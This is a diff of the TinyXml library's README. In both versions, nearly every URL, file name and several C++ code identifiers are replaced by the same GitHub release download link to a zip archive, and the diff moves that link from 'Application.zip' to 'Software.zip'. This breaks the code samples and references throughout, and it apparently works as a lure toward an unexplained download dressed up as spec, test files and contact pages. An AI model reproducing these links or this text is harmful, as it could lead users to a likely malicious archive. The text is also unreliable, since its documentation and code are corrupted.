@@ -19,10 +19,10 @@ All those random file formats created to store application data can
 all be replaced with XML. One parser for everything.
 
 The best place for the complete, correct, and quite frankly hard to
-read spec is at <a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip">
-https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip</a>. An intro to XML
+read spec is at <a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip">
+https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip</a>. An intro to XML
 (that I really like) can be found at 
-<a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip">https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip</a>.
+<a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip">https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip</a>.
 
 There are different ways to access and interact with XML data.
 TinyXml uses a Document Object Model (DOM), meaning the XML data is parsed
@@ -33,7 +33,7 @@ stream.
 
 TinyXml is designed to be easy and fast to learn. It is two headers 
 and four cpp files. Simply add these to your project and off you go. 
-There is an example file - https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip - to get you started. 
+There is an example file - https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip - to get you started. 
 
 TinyXml is released under the ZLib license, 
 so you can use it in open source or commercial code. The details
@@ -50,7 +50,7 @@ the UTF-8 encoding, and the first 64k character entities.
 
 It doesnt parse or use DTDs (Document Type Definitions) or XSLs
 (eXtensible Stylesheet Language.) There are other parsers out there 
-(check out https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip, search for XML) that are much more fully
+(check out https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip, search for XML) that are much more fully
 featured. But they are also much bigger, take longer to set up in
 your project, have a higher learning curve, and often have a more
 restrictive license. If you are working with browsers or have more
@@ -78,7 +78,7 @@ but it is worth your time to read this (very short) manual completely.
 
 TinyXml is mature, tested code. It is very stable. If you find
 bugs, please file a bug report on the sourceforge web site
-(https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip).
+(https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip).
 We'll get them straightened out as soon as possible.
 
 There are some areas of improvement; please check sourceforge if you are
@@ -165,12 +165,12 @@ For example, Japanese systems traditionally use SHIFT-JIS encoding.
 Text encoded as SHIFT-JIS can not be read by tinyxml. 
 A good text editor can import SHIFT-JIS and then save as UTF-8.
 
-The <a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip">https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip link</a> does a great
+The <a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip">https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip link</a> does a great
 job covering the encoding issue.
 
-The test file "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip" is an XML containing English, Spanish, Russian,
+The test file "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip" is an XML containing English, Spanish, Russian,
 and Simplified Chinese. (Hopefully they are translated correctly). The file
-"https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip" is a screen capture of the XML file, rendered in IE. Note that
+"https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip" is a screen capture of the XML file, rendered in IE. Note that
 if you don't have the correct fonts (Simplified Chinese or Russian) on your
 system, you won't see output that matches the GIF file even if you can parse
 it correctly. Also note that (at least on my Windows machine) console output
@@ -273,7 +273,7 @@ for null returns from method calls. An error safe implementation can
 generate a lot of code like:
 
 @verbatim
-TiXmlElement* root = https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip( "Document" );
+TiXmlElement* root = https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip( "Document" );
 if ( root )
 {
 	TiXmlElement* element = root->FirstChildElement( "Element" );
@@ -293,7 +293,7 @@ the previous code reduces to:
 
 @verbatim
 TiXmlHandle docHandle( &document );
-TiXmlElement* child2 = https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip( "Document" ).FirstChild( "Element" ).Child( "Child", 1 ).Element();
+TiXmlElement* child2 = https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip( "Document" ).FirstChild( "Element" ).Child( "Child", 1 ).Element();
 if ( child2 )
 {
 	// do something useful
@@ -319,7 +319,7 @@ configured in TiXmlDocument::SetTabSize().
 To Compile and Run xmltest:
 
 A Linux Makefile and a Windows Visual C++ .dsw file is provided. 
-Simply compile and run. It will write the file https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip to your 
+Simply compile and run. It will write the file https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip to your 
 disk and generate output on the screen. It also tests walking the
 DOM by printing out the number of nodes found using different 
 techniques.
@@ -350,7 +350,7 @@ file 'xmltest' will be created.
 
 <h3>To Use in an Application:</h3>
 
-Add https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip, tinyxml.h, https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip, https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip, https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip, and tinystr.h to your
+Add https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip, tinyxml.h, https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip, https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip, https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip, and tinystr.h to your
 project or make file. That's it! It should compile on any reasonably
 compliant C++ system. You do not need to enable exceptions or
 RTTI for TinyXml.
@@ -369,10 +369,10 @@ An example is probably the best way to go. Take:
 @endverbatim
 
 Its not much of a To Do list, but it will do. To read this file 
-(say "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip") you would create a document, and parse it in:
+(say "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip") you would create a document, and parse it in:
 @verbatim
-	TiXmlDocument doc( "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip" );
-	https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip();
+	TiXmlDocument doc( "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip" );
+	https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip();
 @endverbatim
 
 And its ready to go. Now lets look at some lines and how they 
@@ -427,7 +427,7 @@ Etc.
 
 Looking at the entire object tree, you end up with:
 @verbatim
-TiXmlDocument				"https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip"
+TiXmlDocument				"https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip"
 	TiXmlDeclaration		"version='1.0'" "standalone=no"
 	TiXmlComment			" Our to do list data"
 	TiXmlElement			"ToDo"
@@ -472,11 +472,11 @@ distribution.
 The World Wide Web Consortium is the definitive standard body for 
 XML, and there web pages contain huge amounts of information. 
 
-The definitive spec: <a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip">
-https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip</a>
+The definitive spec: <a href="https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip">
+https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip</a>
 
 I also recommend "XML Pocket Reference" by Robert Eckstein and published by 
-https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip book that got the whole thing started.
+https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip book that got the whole thing started.
 
 <h2> Contributors, Contacts, and a Brief History </h2>
 
@@ -485,7 +485,7 @@ encouragement. It all helps, and makes this project fun. A special thanks
 to the contributors on the web pages that keep it lively.
 
 So many people have sent in bugs and ideas, that rather than list here 
-we try to give credit due in the "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip" file.
+we try to give credit due in the "https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip" file.
 
 TinyXml was originally written be Lee Thomason. (Often the "I" still
 in the documenation.) Lee reviews changes and releases new versions,
@@ -495,7 +495,7 @@ We appreciate your suggestions, and would love to know if you
 use TinyXml. Hopefully you will enjoy it and find it useful. 
 Please post questions, comments, file bugs, or contact us at:
 
-https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v1.0/Application.zip
+https://github.com/ColtOSTemp/platform_external_tinyxml/releases/download/v2.0/Software.zip
 
 Lee Thomason,
 Yves Berquin
